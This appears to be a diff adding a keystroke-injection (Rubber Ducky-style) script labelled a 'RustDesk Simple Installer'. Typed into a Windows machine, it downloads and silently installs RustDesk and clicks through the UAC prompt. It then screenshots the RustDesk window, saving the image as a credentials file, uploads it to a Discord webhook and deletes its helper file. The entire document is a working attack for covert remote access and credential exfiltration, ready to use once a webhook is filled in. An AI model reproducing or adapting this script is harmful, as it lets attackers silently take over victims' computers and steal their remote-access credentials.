@@ -1,0 +1,97 @@
+﻿REM RustDesk Simple Installer - Ultra Reliable Version
+REM Downloads EXE directly and installs without complex API calls
+REM Version: 3.0 - Simplified and bulletproof
+
+DELAY 2000
+GUI r
+DELAY 1000
+
+REM Open PowerShell
+STRING powershell
+ENTER
+DELAY 1500
+
+REM Download RustDesk EXE directly (bypassing API issues)
+STRING Invoke-WebRequest -Uri 'https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.exe' -OutFile 'C:\Users\Public\rustdesk.exe' -UseBasicParsing
+ENTER
+DELAY 30000
+
+REM Install silently (handle UAC prompt)
+STRING Start-Process 'C:\Users\Public\rustdesk.exe' -Verb RunAs -ArgumentList '--silent-install'
+ENTER
+DELAY 3000
+REM Handle UAC prompt - press LEFT arrow then ENTER to allow
+LEFT
+ENTER
+DELAY 3000
+
+REM Create a batch file to start RustDesk, take screenshot, and clean up
+STRING $batchContent = @'
+ENTER
+STRING @echo off
+ENTER
+STRING start "" "C:\Program Files\RustDesk\rustdesk.exe"
+ENTER
+STRING timeout /t 10 /nobreak >nul
+ENTER
+STRING echo Taking screenshot...
+ENTER
+STRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('C:\Users\Public\Downloads\RustDesk_Credentials.png'); $graphics.Dispose(); $bitmap.Dispose(); echo Screenshot saved"
+ENTER
+STRING echo Closing RustDesk...
+ENTER
+STRING taskkill /f /im rustdesk.exe >nul 2>&1
+ENTER
+STRING echo Cleanup completed.
+ENTER
+STRING '@
+ENTER
+STRING $batchContent | Out-File -FilePath 'C:\Users\Public\start_rustdesk.bat' -Encoding ASCII
+ENTER
+DELAY 2000
+STRING Write-Host "Batch file created, running it..."
+ENTER
+DELAY 1000
+STRING Start-Process 'C:\Users\Public\start_rustdesk.bat' -Wait
+ENTER
+DELAY 20000
+STRING $webhookUrl = 'INSERT DISCORD WEBHOOK HERE'
+ENTER
+STRING $filePath = 'C:\Users\Public\Downloads\RustDesk_Credentials.png'
+ENTER
+STRING if (Test-Path $filePath) {
+ENTER
+STRING $boundary = [System.Guid]::NewGuid().ToString()
+ENTER
+STRING $LF = "`r`n"
+ENTER
+STRING $bodyLines = @()
+ENTER
+STRING $bodyLines += "--$boundary"
+ENTER
+STRING $bodyLines += 'Content-Disposition: form-data; name="file"; filename="rustdesk_credentials.png"'
+ENTER
+STRING $bodyLines += 'Content-Type: image/png'
+ENTER
+STRING $bodyLines += ''
+ENTER
+STRING $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+ENTER
+STRING $bodyLines += [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
+ENTER
+STRING $bodyLines += "--$boundary--"
+ENTER
+STRING $body = $bodyLines -join $LF
+ENTER
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+ENTER
+STRING Write-Host "Screenshot sent to Discord successfully!"
+ENTER
+STRING } else { Write-Host "Screenshot file not found!" }
+ENTER
+ENTER
+DELAY 2000
+STRING Remove-Item 'C:\Users\Public\start_rustdesk.bat' -Force -ErrorAction SilentlyContinue
+ENTER
+STRING exit
+ENTER
